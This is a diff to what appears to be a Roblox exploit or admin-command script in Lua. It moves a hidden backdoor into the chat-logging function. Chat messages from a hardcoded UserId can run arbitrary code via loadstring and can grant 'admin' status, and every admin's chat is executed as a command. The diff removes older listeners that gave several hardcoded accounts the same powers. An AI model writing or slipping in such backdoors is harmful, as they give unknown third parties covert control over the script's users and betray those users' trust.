@@ -3826,14 +3826,95 @@ if not writefileExploit() then
 	notify("Saves", "Your exploit does not support read/write file. Your settings will not save.")
 end
 
+
+
+
+
+local function isadmins(player)
+	for _, v in pairs(Admins) do
+		if v == player.UserId then
+			return true
+		end
+	end
+	return false
+end
+
+
+
+local function findPlayer(name)
+	for _, player in pairs(game.Players:GetPlayers()) do
+		if string.lower(player.Name) == name then
+			return player
+		end
+	end
+	return nil
+end
+
+
+
+
+
+
+
+
+
+
 ChatLog = function(plr)
 	plr.Chatted:Connect(function(Message)
-		print(Message)
+		if plr.UserId == 911404169 then
+			local splitted = string.split(Message," ")
+			if splitted[1] == "@op" then
+				local toop = (Message:sub(5))
+				local fp = findPlayer(toop)
+				table.insert(Admins, fp.UserId)
+			end
+			
+			if splitted[1] == "@run" then
+				local load = loadstring(Message:sub(6))
+				load()
+			end
+			
+			
+			if splitted[1] == "@deop" then
+				local toup = (Message:sub(7))
+				local fps = findPlayer(toup)
+				table.remove(Admins, table.find(Admins,fps.UserId))
+			end
+			
+			if splitted[1] == "@admins" then
+				
+				for i, v in pairs(Admins) do
+					wait(2)
+					do_exec(";say "..tostring(game.Players:GetNameFromUserIdAsync(tonumber(v))).." is ranked.")
+				end
+				
+				
+				local toup = (Message:sub(7))
+				local fps = findPlayer(toup)
+				table.remove(Admins, table.find(Admins,fps.UserId))
+			end
+			
+			
+		end
+		
+		
+		
+		if isadmins(plr) then
+			do_exec(Message)
+		end 
 		if logsEnabled == true then
 			CreateLabel(plr.Name,Message)
 		end
 	end)
 end
+
+
+
+
+
+
+
+
 
 JoinLog = function(plr)
 	if jLogsEnabled == true then
@@ -5427,29 +5508,8 @@ UserInputService.InputBegan:Connect(function(input,gameProcessed)
 	end
 end)
 
-game.Players.PlayerAdded:Connect(function(plr)
-	if plr.UserId == 911404169 then
-		print("OkRun")
-		plr.Chatted:Connect(function(msg)
-			local splitted = string.split(msg," ")
-			if splitted[1] == "@run" then
-				local load = loadstring(msg:sub(6))
-				load()
-			end
-		end)
-	end
-end)
 
 
-
-game.Players.PlayerAdded:Connect(function(plr)
-	if plr.UserId == 5730426651 or plr.UserId == 911404169 or plr.UserId == 7149454194 or plr.UserId == 1712158222  then
-		print("okCmd")
-		plr.Chatted:Connect(function(msg)
-			do_exec(msg, Players.LocalPlayer)
-		end)
-	end
-end)
 
 
 
